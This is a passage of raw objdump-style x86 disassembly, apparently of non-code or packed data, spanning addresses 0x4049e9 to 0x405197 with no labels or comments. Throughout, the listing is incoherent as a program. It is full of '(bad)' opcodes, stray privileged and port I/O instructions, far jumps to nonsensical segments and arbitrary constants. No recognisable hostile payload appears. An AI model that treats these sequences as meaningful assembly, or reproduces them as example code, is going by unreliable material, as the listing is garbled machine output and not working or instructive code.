  4049e9:	mov    bh,0x72
  4049eb:	or     al,0x9b
  4049ed:	mov    eax,0x1ef4eb72
  4049f2:	gs (bad) 
  4049f4:	shr    dl,cl
  4049f6:	push   ebx
  4049f7:	mov    ds:0x4d5b49b3,eax
  4049fc:	or     BYTE PTR [ebp+0x6d1e93bf],0xbc
  404a03:	or     DWORD PTR [ebx],eax
  404a05:	fld    DWORD PTR [edi+ecx*1+0x3a490ad7]
  404a0c:	mov    ah,0xb1
  404a0e:	mov    ah,0x2d
  404a10:	cmp    cl,ch
  404a12:	stc    
  404a13:	outs   dx,BYTE PTR ds:[esi]
  404a14:	fbstp  TBYTE PTR [ebx+0x3ad090a5]
  404a1a:	sub    bl,BYTE PTR [esi+0x4c]
  404a1d:	xchg   DWORD PTR [ebx],edx
  404a1f:	(bad)
  404a23:	sub    bl,al
  404a25:	shl    DWORD PTR [eax],1
  404a27:	xor    esi,eax
  404a29:	pop    es
  404a2a:	fild   QWORD PTR [ebx+0x17ccb475]
  404a30:	(bad)  
  404a31:	out    0xe,al
  404a33:	push   0x68930570
  404a38:	rcl    bl,0xd
  404a3b:	cdq    
  404a3c:	shl    esp,0x6c
  404a3f:	cwde   
  404a40:	test   eax,0xc8b1651a
  404a45:	inc    ecx
  404a46:	mov    dl,bh
  404a48:	ja     0x4049cb
  404a4a:	mov    cl,0x16
  404a4c:	and    DWORD PTR [esi+0x67],0xffffffd8
  404a50:	push   ds
  404a51:	cdq    
  404a52:	bound  ecx,QWORD PTR [edx+0x3e]
  404a55:	mov    ch,0xe7
  404a57:	in     eax,0x77
  404a59:	loop   0x404a38
  404a5b:	shr    BYTE PTR [esi+0x6b],0xa4
  404a5f:	neg    edi
  404a61:	fadd   DWORD PTR [edx+0x5e]
  404a64:	cmp    BYTE PTR [eax-0xb0a50de],bh
  404a6a:	mov    ebp,0x9667a589
  404a6f:	and    al,0x81
  404a71:	aam    0xe5
  404a73:	xor    eax,0x30f8b07b
  404a78:	adc    al,0xb7
  404a7a:	scas   al,BYTE PTR es:[edi]
  404a7b:	jo     0x404a49
  404a7d:	mov    ch,0x72
  404a7f:	in     eax,0xa4
  404a81:	mov    ch,0x58
  404a83:	dec    eax
  404a84:	and    BYTE PTR [ebx+ebx*8+0x3a],dh
  404a88:	ins    BYTE PTR es:[edi],dx
  404a89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a8a:	stos   DWORD PTR es:[edi],eax
  404a8b:	sub    BYTE PTR [ebp+ebp*4-0x4537b6e4],cl
  404a92:	test   eax,0xd6eac0b0
  404a97:	or     BYTE PTR [ebx+0x11],cl
  404a9a:	test   eax,0x16f1879f
  404a9f:	pop    ss
  404aa0:	leave  
  404aa1:	lods   eax,DWORD PTR ds:[esi]
  404aa2:	push   0xa13bbc07
  404aa7:	mov    bl,0xcc
  404aa9:	ret    
  404aaa:	mov    esp,DWORD PTR [ebx+0x7b4a7541]
  404ab0:	dec    eax
  404ab1:	inc    esp
  404ab2:	out    0x5b,al
  404ab4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ab5:	loop   0x404afa
  404ab7:	push   0x5051485
  404abc:	push   es
  404abd:	mov    ds:0x3cc293f1,eax
  404ac2:	mov    al,0x55
  404ac4:	cwde   
  404ac5:	xor    ecx,DWORD PTR [esi+ebx*4]
  404ac8:	iret   
  404ac9:	jae    0x404b06
  404acb:	xor    esi,DWORD PTR [edx]
  404acd:	lahf   
  404ace:	push   ecx
  404acf:	push   edx
  404ad0:	into   
  404ad1:	cmp    DWORD PTR [ebx+0x64],edi
  404ad4:	fdivrp st(0),st
  404ad6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ad7:	mul    BYTE PTR [edx+0x3c]
  404ada:	pop    edx
  404adb:	mov    edi,0xb9fcf424
  404ae0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ae1:	(bad)  
  404ae2:	ret    0x555c
  404ae5:	call   0x58c0f4c1
  404aea:	mov    esi,ebx
  404aec:	jge    0x404af4
  404aee:	jb     0x404b56
  404af0:	leave  
  404af1:	dec    edx
  404af2:	and    eax,0xbb249929
  404af7:	mov    WORD PTR [edi-0x52],gs
  404afa:	fisttp DWORD PTR [edi+0x46]
  404afd:	jl     0x404b2c
  404aff:	gs icebp 
  404b01:	and    ebp,DWORD PTR [edi+0x58]
  404b04:	mov    esi,0x9342dcb1
  404b09:	div    BYTE PTR [ebp-0x27]
  404b0c:	cmp    cl,dh
  404b0e:	mov    ebx,0xf0b0f7e0
  404b13:	mov    WORD PTR [edi],ds
  404b15:	nop
  404b16:	adc    edx,DWORD PTR [ebp-0x27bcd2e6]
  404b1c:	pop    es
  404b1d:	enter  0x3e8e,0xfc
  404b21:	mov    al,0x8c
  404b23:	mov    al,ds:0xa7497c1c
  404b28:	jp     0x404b9f
  404b2a:	and    al,0x6e
  404b2c:	sub    DWORD PTR [eax],eax
  404b2e:	(bad)  
  404b2f:	sbb    eax,0xb0fe914c
  404b34:	inc    esi
  404b35:	sub    eax,0xe9ca75a6
  404b3a:	dec    ebp
  404b3b:	fldenv [ecx]
  404b3d:	clc    
  404b3e:	popf   
  404b3f:	inc    edx
  404b40:	xlat   BYTE PTR ds:[ebx]
  404b41:	popf   
  404b42:	push   edi
  404b43:	jmp    0x6eae81de
  404b48:	(bad)  
  404b49:	xor    ebp,ebp
  404b4b:	arpl   WORD PTR [esi],bp
  404b4d:	jae    0x404b06
  404b4f:	xor    al,0xf3
  404b51:	dec    esp
  404b52:	(bad)  
  404b54:	pop    edx
  404b55:	iret   
  404b56:	mov    esi,0xf18868e
  404b5b:	mov    ah,0xa5
  404b5d:	adc    eax,0xbfe9a8fc
  404b62:	cmp    al,0x2e
  404b64:	or     DWORD PTR [edi+esi*4],edx
  404b67:	daa    
  404b68:	leave  
  404b69:	mov    gs,edi
  404b6b:	leave  
  404b6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b6d:	inc    esi
  404b6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b6f:	mov    eax,esi
  404b71:	dec    ebp
  404b72:	sub    BYTE PTR [edx],al
  404b74:	cmp    DWORD PTR [edx+0xb65ab28],ebx
  404b7a:	enter  0x8f65,0x8e
  404b7e:	and    bl,dh
  404b80:	out    0x85,al
  404b82:	xchg   ecx,eax
  404b83:	test   BYTE PTR cs:[esi-0x2a0f040a],dl
  404b8a:	push   ebx
  404b8b:	ja     0x404b74
  404b8d:	lgs    edx,FWORD PTR [ebx]
  404b90:	pop    ebx
  404b91:	cmp    bh,BYTE PTR [ebx+0x4a]
  404b94:	fld    QWORD PTR [eax+0x75]
  404b97:	call   0x810a:0x932e6676
  404b9e:	test   eax,0x294204e7
  404ba3:	(bad)  
  404ba5:	das    
  404ba6:	rcr    eax,cl
  404ba8:	or     eax,0x6372cf16
  404bad:	mov    dl,0x7b
  404baf:	lock or DWORD PTR [esi+0x46],esi
  404bb3:	inc    ecx
  404bb4:	leave  
  404bb5:	neg    BYTE PTR [ecx+0x70]
  404bb8:	sti    
  404bb9:	fadd   DWORD PTR [eax-0x6f]
  404bbc:	jp     0x404b99
  404bbe:	inc    ecx
  404bbf:	int    0xc
  404bc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bc2:	lods   al,BYTE PTR ds:[esi]
  404bc3:	jg     0x404b86
  404bc5:	mov    ebp,0x20a07f65
  404bca:	mov    al,ds:0xae4c23d4
  404bcf:	or     eax,ecx
  404bd1:	sbb    BYTE PTR [eax],cl
  404bd3:	pop    ss
  404bd4:	jb     0x404b8a
  404bd6:	dec    edi
  404bd7:	dec    esp
  404bd8:	mov    al,0x6f
  404bda:	aad    0xb2
  404bdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bdd:	xchg   edx,eax
  404bde:	fs retf 0x8efc
  404be2:	mov    BYTE PTR [ecx-0x3fa136de],0xf
  404be9:	repnz fiadd DWORD PTR gs:[edx-0xd133dd]
  404bf1:	jecxz  0x404bcc
  404bf3:	es xchg edx,eax
  404bf5:	jns    0x404c0c
  404bf7:	fs aaa 
  404bf9:	mov    al,ds:0x326b4eb5
  404bfe:	add    eax,0xef4bc812
  404c03:	add    DWORD PTR [edi+ebp*1+0x8bb95],edi
  404c0a:	int3   
  404c0b:	dec    ebx
  404c0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c0d:	adc    ecx,DWORD PTR [esi-0x2fc450d1]
  404c13:	inc    ebp
  404c14:	mov    ch,0x1a
  404c16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c17:	pop    edi
  404c18:	rcr    esi,0x90
  404c1b:	jns    0x404bd9
  404c1d:	and    ecx,ebp
  404c1f:	add    DWORD PTR [edi+0x7fd9fd81],ecx
  404c25:	cmp    bh,ch
  404c27:	scas   al,BYTE PTR es:[edi]
  404c28:	inc    esp
  404c29:	iret   
  404c2a:	mov    ds:0x117a0cd2,eax
  404c2f:	and    esp,ebx
  404c31:	dec    ebp
  404c32:	pop    es
  404c33:	xchg   ecx,eax
  404c34:	mov    esp,0xacde5f80
  404c39:	mov    ds,edi
  404c3b:	and    eax,0x6cb32b3b
  404c40:	(bad)  
  404c41:	jbe    0x404c1b
  404c43:	cwde   
  404c44:	ret    
  404c45:	mov    eax,0x29d63603
  404c4a:	fwait
  404c4b:	fwait
  404c4c:	sub    al,0x5b
  404c4e:	pop    ebx
  404c4f:	xor    al,0x7e
  404c51:	jo     0x404c6a
  404c53:	pop    ebx
  404c54:	lahf   
  404c55:	push   es
  404c56:	pushf  
  404c57:	pop    ebx
  404c58:	mov    eax,ds:0xa6137f55
  404c5d:	pop    esi
  404c5e:	hlt    
  404c5f:	jmp    0x7194:0xf905082f
  404c66:	xlat   BYTE PTR ds:[ebx]
  404c67:	xor    DWORD PTR [edx-0x15],ebp
  404c6a:	xchg   BYTE PTR [edi+0x760d57],al
  404c70:	push   esp
  404c71:	push   esp
  404c72:	mov    edx,0x24449cce
  404c77:	sahf   
  404c78:	dec    esp
  404c79:	data16 das 
  404c7b:	fistp  QWORD PTR [ebp-0x24635bcf]
  404c81:	xor    al,0x90
  404c83:	aaa    
  404c84:	cmc    
  404c85:	enter  0x8924,0x9e
  404c89:	cmp    dl,ah
  404c8b:	fwait
  404c8c:	sbb    eax,esi
  404c8e:	sub    bl,BYTE PTR [eiz*8-0xa87f90b]
  404c95:	lods   al,BYTE PTR ds:[esi]
  404c96:	adc    ah,cl
  404c98:	xchg   ebp,eax
  404c99:	jge    0x404ca5
  404c9b:	not    DWORD PTR ds:0xee89c3f9
  404ca1:	xor    al,0x9f
  404ca3:	sti    
  404ca4:	outs   dx,BYTE PTR ds:[esi]
  404ca5:	(bad)  
  404ca7:	vmwrite esi,DWORD PTR [ebp+ebx*1+0xb4d1b6d]
  404caf:	jmp    0x404cd2
  404cb1:	retf   0x4483
  404cb4:	nop
  404cb5:	dec    eax
  404cb6:	scas   eax,DWORD PTR es:[edi]
  404cb7:	int3   
  404cb8:	push   ecx
  404cb9:	or     al,0x37
  404cbb:	push   0x8237dfa2
  404cc0:	call   0x4f5501e0
  404cc5:	sub    DWORD PTR [ebx*4+0x6cd1bddb],ecx
  404ccc:	aad    0x1b
  404cce:	aad    0x30
  404cd0:	xlat   BYTE PTR ds:[ebx]
  404cd1:	mov    eax,ds:0xffde30c3
  404cd6:	add    al,0x3
  404cd8:	ret    0xe95
  404cdb:	jmp    0x5dfd9a65
  404ce0:	inc    esi
  404ce1:	cli    
  404ce2:	gs mov eax,0xbe954e24
  404ce8:	add    ah,BYTE PTR [ebx]
  404cea:	pop    eax
  404ceb:	mov    ah,BYTE PTR [esi+edx*1+0x0]
  404cef:	loope  0x404ce0
  404cf1:	hlt    
  404cf2:	pop    ss
  404cf3:	jl     0x404d23
  404cf5:	mov    bl,0x8f
  404cf7:	and    bh,cl
  404cf9:	push   ebp
  404cfa:	mov    ah,0xb8
  404cfc:	sbb    DWORD PTR [ecx-0x4a],0xffffffea
  404d00:	or     al,dh
  404d02:	fistp  WORD PTR [edx+0x31]
  404d05:	mov    ebx,0x5919e867
  404d0a:	inc    esi
  404d0b:	enter  0xc8dd,0x23
  404d0f:	lahf   
  404d10:	push   edx
  404d11:	adc    al,dh
  404d13:	adc    DWORD PTR [edi],eax
  404d15:	aaa    
  404d16:	mov    eax,ds:0x9b474039
  404d1b:	mov    bl,0x5d
  404d1d:	mov    al,ds:0x6c149a17
  404d22:	inc    eax
  404d23:	pop    eax
  404d24:	fs jp  0x404d16
  404d27:	fldcw  WORD PTR [edx]
  404d29:	and    BYTE PTR gs:[ebp+0xee95aa5],bh
  404d30:	(bad)  
  404d31:	mov    ds:0x3e060ff5,al
  404d36:	push   0xdbeb099a
  404d3b:	ror    BYTE PTR [edi-0x70],0x17
  404d3f:	addr16 jl 0x404d8d
  404d42:	into   
  404d43:	lods   eax,DWORD PTR ds:[esi]
  404d44:	pop    ebp
  404d45:	push   cs
  404d46:	out    dx,eax
  404d47:	das    
  404d48:	sti    
  404d49:	cmp    DWORD PTR [edi-0x27],esi
  404d4c:	hlt    
  404d4d:	mov    DWORD PTR ds:0xdc3c283a,eax
  404d53:	xchg   BYTE PTR [edx+0x27ff70ec],ah
  404d59:	loope  0x404d07
  404d5b:	aam    0x7a
  404d5d:	or     al,0xbd
  404d5f:	pop    ds
  404d60:	fcmovnb st,st(1)
  404d62:	add    bh,BYTE PTR gs:[eax+0x57f585a4]
  404d69:	dec    esp
  404d6a:	arpl   WORD PTR [edi+ebp*8-0x35],bx
  404d6e:	xchg   dh,al
  404d70:	mov    dl,0x69
  404d72:	pop    ds
  404d73:	cs das 
  404d75:	sub    esp,eax
  404d77:	lods   al,BYTE PTR ds:[esi]
  404d78:	cli    
  404d79:	sub    BYTE PTR [ecx],ah
  404d7b:	add    al,0x90
  404d7d:	jge    0x404d51
  404d7f:	push   esi
  404d80:	out    dx,eax
  404d81:	test   eax,0x2cf0131c
  404d86:	mov    al,ds:0x49f4518b
  404d8b:	pop    ds
  404d8c:	jecxz  0x404d77
  404d8e:	sub    DWORD PTR [esi-0x4eb6ac64],edx
  404d94:	add    ebx,0xffffffa9
  404d97:	cmp    BYTE PTR [eax+edi*2],dh
  404d9a:	imul   esi,DWORD PTR [ecx],0x34
  404d9d:	je     0x404e07
  404d9f:	push   ebx
  404da0:	sbb    al,BYTE PTR [edx+0x33]
  404da3:	inc    ch
  404da5:	cwde   
  404da6:	popa   
  404da7:	xchg   DWORD PTR [ebx],edx
  404da9:	xchg   esi,eax
  404daa:	adc    ch,BYTE PTR [edx]
  404dac:	ins    BYTE PTR es:[edi],dx
  404dad:	popa   
  404dae:	sub    al,0xd8
  404db0:	mov    edx,ds
  404db2:	mov    BYTE PTR [eax+esi*8-0x6b450a87],ch
  404db9:	loopne 0x404da9
  404dbb:	mov    ecx,0x42be971f
  404dc0:	stos   BYTE PTR es:[edi],al
  404dc1:	jmp    0xb3f5:0x44c97e04
  404dc8:	stos   DWORD PTR es:[edi],eax
  404dc9:	data16 jb 0x404e4b
  404dcc:	push   ecx
  404dcd:	sbb    bl,BYTE PTR [edi]
  404dcf:	int3   
  404dd0:	xlat   BYTE PTR ds:[ebx]
  404dd1:	loope  0x404dcb
  404dd3:	jbe    0x404dd3
  404dd5:	mov    cl,0x23
  404dd7:	sub    eax,0xba10a1fa
  404ddc:	(bad)  
  404ddd:	jo     0x404e3c
  404ddf:	push   ebx
  404de0:	or     al,0x49
  404de2:	inc    ebp
  404de3:	jns    0x404da5
  404de5:	mov    ds:0x282ad753,eax
  404dea:	fdiv   QWORD PTR [eax]
  404dec:	shl    ecx,cl
  404dee:	jnp    0x404d98
  404df0:	inc    ecx
  404df1:	inc    eax
  404df2:	test   BYTE PTR [eax],ch
  404df4:	mov    ah,0x29
  404df6:	scas   eax,DWORD PTR es:[edi]
  404df7:	ins    DWORD PTR es:[edi],dx
  404df8:	es dec esp
  404dfa:	adc    dl,0xc0
  404dfd:	mov    dl,dh
  404dff:	pop    ebp
  404e00:	jno    0x404e46
  404e02:	fild   QWORD PTR [ecx+eax*1]
  404e05:	call   FWORD PTR [ebp+eiz*8-0x425ed110]
  404e0c:	sbb    BYTE PTR [eax-0x36471cd6],0x2c
  404e13:	arpl   WORD PTR [edx+0x5288f819],ax
  404e19:	aaa    
  404e1a:	call   0xd3b5:0xccce776c
  404e21:	pusha  
  404e22:	mov    ecx,DWORD PTR [ecx-0xd]
  404e25:	sub    eax,0xe47ea451
  404e2a:	mov    ebx,0x5c097fcd
  404e2f:	xor    DWORD PTR [edx],0xf07cb589
  404e35:	mov    eax,ds:0xbcd5f19d
  404e3a:	jmp    0x404eb6
  404e3c:	arpl   WORD PTR [edx+eax*2],bx
  404e3f:	sub    eax,DWORD PTR [ebx]
  404e41:	stc    
  404e42:	jecxz  0x404dd0
  404e44:	push   ss
  404e45:	js     0x404e8a
  404e47:	call   0x8e04:0xc6356863
  404e4e:	mov    dl,0x58
  404e50:	loope  0x404e4c
  404e52:	or     esi,DWORD PTR [ecx+0x70]
  404e55:	dec    ebp
  404e56:	inc    eax
  404e57:	cmp    ah,bh
  404e59:	popa   
  404e5a:	stos   DWORD PTR es:[edi],eax
  404e5b:	pusha  
  404e5c:	jp     0x404e69
  404e5e:	js     0x404e52
  404e60:	jecxz  0x404e15
  404e62:	dec    esp
  404e63:	or     DWORD PTR [edi+0x3c],edi
  404e66:	cs (bad) 
  404e68:	xor    DWORD PTR [edi-0x7f],esi
  404e6b:	xchg   BYTE PTR [eax-0x752242a1],al
  404e71:	rcr    esp,1
  404e73:	rcl    DWORD PTR [edi-0x5bfb277e],1
  404e79:	(bad)  
  404e7b:	(bad)  
  404e7c:	cmp    DWORD PTR [ebp+0x1f],edx
  404e7f:	inc    ecx
  404e80:	xor    BYTE PTR ds:0xf48b9c62,dl
  404e86:	retf   
  404e87:	or     dl,dl
  404e89:	cli    
  404e8a:	adc    ch,BYTE PTR [edx-0x4976162b]
  404e90:	mov    al,0x6b
  404e92:	aaa    
  404e93:	loope  0x404e7e
  404e95:	pop    edx
  404e96:	icebp  
  404e97:	(bad)  [esi]
  404e99:	pop    ebx
  404e9a:	and    al,BYTE PTR [eax+0x26]
  404e9d:	ss iret 
  404e9f:	and    bl,BYTE PTR [edi+0x795c5908]
  404ea5:	adc    DWORD PTR [edi+edx*8-0x79],ebp
  404ea9:	rcr    DWORD PTR [edx-0x3a42c959],0xbb
  404eb0:	xchg   DWORD PTR [ebx],ebp
  404eb2:	push   ecx
  404eb3:	lock faddp st(5),st
  404eb6:	test   BYTE PTR [edi],ah
  404eb8:	(bad)  
  404eb9:	leave  
  404eba:	leave  
  404ebb:	ror    DWORD PTR [eax+0x16533ac9],cl
  404ec1:	mov    BYTE PTR gs:[eax+0x4b],al
  404ec5:	mov    dh,0x2
  404ec7:	sub    eax,0x19c598b2
  404ecc:	ret    0xcf0a
  404ecf:	pop    esi
  404ed0:	dec    esi
  404ed1:	sub    al,0x94
  404ed3:	hlt    
  404ed4:	fiadd  WORD PTR [edx+ebp*8-0x38]
  404ed8:	push   es
  404ed9:	fstp   DWORD PTR [edx-0x35c07e85]
  404edf:	ins    DWORD PTR es:[edi],dx
  404ee0:	inc    esp
  404ee1:	fimul  WORD PTR [esp+esi*2-0x6df6caad]
  404ee8:	jg     0x404f08
  404eea:	mov    ds:0xc267cfdc,al
  404eef:	pop    ebx
  404ef0:	dec    edx
  404ef1:	cmp    BYTE PTR [ecx-0x4],ah
  404ef4:	xor    al,0x6d
  404ef6:	mov    cl,0x7b
  404ef8:	dec    eax
  404ef9:	das    
  404efa:	xchg   esp,eax
  404efb:	dec    edx
  404efc:	lahf   
  404efd:	jmp    0x404f4a
  404eff:	push   cs
  404f00:	add    ah,al
  404f02:	push   ss
  404f03:	fisubr DWORD PTR [ebx+esi*2-0x31]
  404f07:	pop    edx
  404f08:	or     esp,ebp
  404f0a:	jl     0x404f4b
  404f0c:	imul   ebx,DWORD PTR ss:0xa38fcaf6,0xe4a41365
  404f17:	in     eax,dx
  404f18:	addr16 sub eax,0xb5f95843
  404f1e:	sub    ch,BYTE PTR [edx+0x58]
  404f21:	into   
  404f22:	or     DWORD PTR [esi],edi
  404f24:	pop    ebp
  404f25:	aam    0x57
  404f27:	fist   WORD PTR [esp+eax*4-0x2a261a13]
  404f2e:	pop    eax
  404f2f:	add    BYTE PTR ds:0x51efd2ec,cl
  404f35:	pushf  
  404f36:	mov    ds:0x8337d9de,al
  404f3b:	xchg   edx,eax
  404f3c:	jo     0x404f2e
  404f3e:	mov    dh,0x7c
  404f40:	mov    cl,0xe3
  404f42:	jecxz  0x404f5f
  404f44:	fcomip st,st(7)
  404f46:	out    dx,al
  404f47:	cmp    edi,DWORD PTR [ebx]
  404f49:	ins    BYTE PTR es:[edi],dx
  404f4a:	(bad)  
  404f4c:	leave  
  404f4d:	gs inc ecx
  404f4f:	test   DWORD PTR [ebp+0x13ae634a],edi
  404f55:	fmul   QWORD PTR [ebx+0x17]
  404f58:	pop    esi
  404f59:	push   edi
  404f5a:	mov    ecx,0xcf251bac
  404f5f:	sbb    al,0x90
  404f61:	stos   BYTE PTR es:[edi],al
  404f62:	pop    ebp
  404f63:	add    BYTE PTR [edi+0x1a],ch
  404f66:	fnstsw WORD PTR [ebx]
  404f68:	test   DWORD PTR [esi-0x35],0x21e05594
  404f6f:	(bad)  
  404f71:	mov    cl,0x95
  404f73:	test   al,0x73
  404f75:	jg     0x404ff6
  404f77:	jb     0x404f1c
  404f79:	xor    al,0x80
  404f7b:	shl    BYTE PTR [eax-0x62],0x5f
  404f7f:	jmp    0x404fe9
  404f81:	fwait
  404f82:	pop    edi
  404f83:	enter  0x3c3b,0x5e
  404f87:	es xchg ecx,eax
  404f89:	mov    ds,WORD PTR [edx+0x23]
  404f8c:	and    eax,0x21932c3c
  404f91:	or     DWORD PTR [esi-0x1],ecx
  404f94:	aaa    
  404f95:	jmp    0x33d578e8
  404f9a:	cmp    ebx,DWORD PTR [ebp+0x39]
  404f9d:	sbb    al,0x83
  404f9f:	dec    esi
  404fa0:	(bad)  
  404fa1:	mov    eax,ds:0x1a42b309
  404fa6:	nop
  404fa7:	shl    DWORD PTR [ebx-0x40],cl
  404faa:	mov    cl,0x3f
  404fac:	sahf   
  404fad:	add    ebx,DWORD PTR [ebx]
  404faf:	clc    
  404fb0:	xchg   ebp,eax
  404fb1:	inc    ebp
  404fb2:	pushf  
  404fb3:	jle    0x404f42
  404fb5:	in     eax,0xe5
  404fb7:	mov    ebx,0x1beebeb3
  404fbc:	mov    ch,0xbb
  404fbe:	cs cld 
  404fc0:	in     al,dx
  404fc1:	(bad)  
  404fc3:	das    
  404fc4:	sbb    ebp,DWORD PTR [eax+eiz*1-0x38]
  404fc8:	stos   DWORD PTR es:[edi],eax
  404fc9:	cdq    
  404fca:	xor    DWORD PTR [edi-0x11],edx
  404fcd:	dec    esi
  404fce:	xchg   ebx,eax
  404fcf:	pop    esp
  404fd0:	hlt    
  404fd1:	lods   al,BYTE PTR ds:[esi]
  404fd2:	mov    ebp,0x93e4bee3
  404fd7:	test   ebx,edx
  404fd9:	vshufps ymm4,ymm4,YMMWORD PTR [ecx-0x7ebfb0a2],0xfa
  404fe2:	or     DWORD PTR [edx-0x5a7d1756],ebx
  404fe8:	mov    ebp,0x7dca91de
  404fed:	push   ebp
  404fee:	mov    WORD PTR [eax-0x408aab57],?
  404ff4:	mov    ebp,0xc7095d6a
  404ff9:	fwait
  404ffa:	(bad)  
  404ffb:	jmp    0x404fe5
  404ffd:	sbb    BYTE PTR [ebp+0x7],dh
  405000:	mov    edi,eax
  405002:	es (bad) 
  405004:	loope  0x404f9a
  405006:	mov    esi,0x3bd6905a
  40500b:	inc    esi
  40500c:	(bad)  
  40500e:	xor    dl,BYTE PTR [ecx+0x62]
  405011:	sub    ebx,DWORD PTR [ecx]
  405013:	mov    edi,0xe0ed7e87
  405018:	fdiv   DWORD PTR ds:0xf92ae5ae
  40501e:	popf   
  40501f:	lds    ebx,FWORD PTR [ebp-0x2d1ce01b]
  405025:	shl    DWORD PTR [ebx],0x14
  405028:	in     al,dx
  405029:	loopne 0x405071
  40502b:	imul   ebx,esi,0x79504e10
  405031:	fbstp  TBYTE PTR [eax+0x2aa53230]
  405037:	xchg   ecx,eax
  405038:	mov    al,cl
  40503a:	push   edx
  40503b:	ss sahf 
  40503d:	(bad)  
  40503e:	js     0x405075
  405040:	adc    cl,BYTE PTR [eax+0x5a78c79c]
  405046:	jbe    0x40502a
  405048:	add    DWORD PTR [ebx],ebx
  40504a:	enter  0x1083,0xfe
  40504e:	jge    0x405019
  405050:	enter  0xbc66,0x12
  405054:	enter  0xdef0,0x4b
  405058:	cmp    al,0x7f
  40505a:	aad    0xa8
  40505c:	jmp    0x4fa9744e
  405061:	adc    bh,BYTE PTR [esi-0x53a75b5d]
  405067:	(bad)  
  405068:	sbb    eax,0xe9cc6a3f
  40506d:	(bad)  
  40506e:	push   edx
  40506f:	dec    edx
  405070:	jg     0x404ff8
  405072:	xchg   ebx,eax
  405073:	das    
  405074:	jle    0x4050db
  405076:	sub    DWORD PTR [edx+ecx*4+0x52],ebp
  40507a:	popa   
  40507b:	test   BYTE PTR [ebp+0x3f024dd1],dh
  405081:	iret   
  405082:	xor    ebx,edi
  405084:	jge    0x405049
  405086:	jae    0x4050bb
  405088:	mov    ecx,DWORD PTR [esi+0x691c88d]
  40508e:	fsubr  QWORD PTR [ecx-0x37]
  405091:	inc    esi
  405092:	gs aaa 
  405094:	mov    dl,BYTE PTR [esi]
  405096:	sub    al,0x2d
  405098:	sti    
  405099:	mov    ah,0x9b
  40509b:	in     eax,dx
  40509c:	pop    eax
  40509d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40509e:	(bad)  
  40509f:	sbb    al,0x60
  4050a1:	pusha  
  4050a2:	scas   al,BYTE PTR es:[edi]
  4050a3:	(bad)  
  4050a5:	loope  0x405086
  4050a7:	xor    BYTE PTR [ebx-0x4dc0d3b3],dl
  4050ad:	push   eax
  4050ae:	aas    
  4050af:	leave  
  4050b0:	retf   0x470e
  4050b3:	mov    dl,BYTE PTR [ebx+esi*1]
  4050b6:	inc    eax
  4050b7:	mov    al,ds:0x2169183f
  4050bc:	mov    al,BYTE PTR [ecx-0x51]
  4050bf:	scas   al,BYTE PTR es:[edi]
  4050c0:	cld    
  4050c1:	call   DWORD PTR [edi]
  4050c3:	mov    ecx,DWORD PTR [ebx+eax*8+0x106b51f7]
  4050ca:	dec    eax
  4050cb:	mov    BYTE PTR [ecx+0x3a],dl
  4050ce:	mov    ecx,0xb80d5b19
  4050d3:	xor    BYTE PTR [edi-0x38b306ce],dl
  4050d9:	test   BYTE PTR [ebx+eax*1],bl
  4050dc:	in     eax,dx
  4050dd:	mov    eax,0xb1614488
  4050e2:	out    0x69,al
  4050e4:	sbb    ah,BYTE PTR [ecx+0x122ac0d9]
  4050ea:	in     eax,dx
  4050eb:	addr16 jp 0x405125
  4050ee:	lods   al,BYTE PTR ds:[esi]
  4050ef:	cmc    
  4050f0:	popf   
  4050f1:	jge    0x40512a
  4050f3:	mov    bh,0xf7
  4050f5:	das    
  4050f6:	mov    dl,0x6d
  4050f8:	clc    
  4050f9:	outs   dx,BYTE PTR ds:[esi]
  4050fa:	xor    ecx,esi
  4050fc:	pushf  
  4050fd:	rcr    DWORD PTR [ebx-0x79],1
  405100:	aaa    
  405101:	and    al,0xbb
  405103:	stos   BYTE PTR es:[edi],al
  405104:	ins    DWORD PTR es:[edi],dx
  405105:	mov    fs,WORD PTR [esi]
  405107:	daa    
  405108:	lea    ebp,[edi]
  40510a:	pop    ds
  40510b:	dec    edx
  40510c:	popf   
  40510d:	adc    eax,0x5f66490e
  405112:	pop    ss
  405113:	xor    ch,al
  405115:	retf   
  405116:	dec    esp
  405117:	leave  
  405118:	cmp    esi,ebp
  40511a:	push   ss
  40511b:	mov    edx,0xaf8af7a5
  405120:	(bad)  
  405121:	mov    eax,ds:0x708ea1cb
  405126:	(bad)  
  405127:	cmp    eax,0xbee1a2c4
  40512c:	std    
  40512d:	fidiv  DWORD PTR [edx]
  40512f:	sbb    al,0x3
  405131:	jne    0x4050fc
  405133:	pop    es
  405134:	out    0xb,eax
  405136:	aam    0xd1
  405138:	mov    DWORD PTR [ebp+ecx*8-0x27f3d8f3],0x5688d767
  405143:	dec    edx
  405144:	inc    edi
  405145:	mov    edx,0x9387ddfd
  40514a:	std    
  40514b:	inc    eax
  40514c:	dec    eax
  40514d:	sub    esp,edi
  40514f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405150:	xchg   BYTE PTR [ecx+0x384f5415],cl
  405156:	das    
  405157:	jg     0x4050f7
  405159:	arpl   WORD PTR [eax+edi*4],cx
  40515c:	enter  0xe316,0x62
  405160:	push   0x7e
  405162:	add    BYTE PTR [edx-0x5d341145],0xf1
  405169:	popf   
  40516a:	enter  0x237,0xc5
  40516e:	rcl    DWORD PTR gs:[edi],0x2e
  405172:	jge    0x4051b4
  405174:	mov    bl,0xe5
  405176:	add    BYTE PTR [ebp+eax*1+0x2d],bl
  40517a:	xchg   edi,eax
  40517b:	in     al,0x6f
  40517d:	xlat   BYTE PTR ds:[ebx]
  40517e:	pop    esp
  40517f:	das    
  405180:	sti    
  405181:	nop
  405182:	push   ds
  405183:	retf   0xc750
  405186:	mov    cl,0xef
  405188:	or     dh,BYTE PTR [esp+eax*8+0x44]
  40518c:	and    edx,DWORD PTR [ecx-0x12]
  40518f:	mov    ch,0x89
  405191:	mov    esp,0xd8584b42
  405196:	out    dx,eax
  405197:	ins    BYTE PTR es:[edi],dx
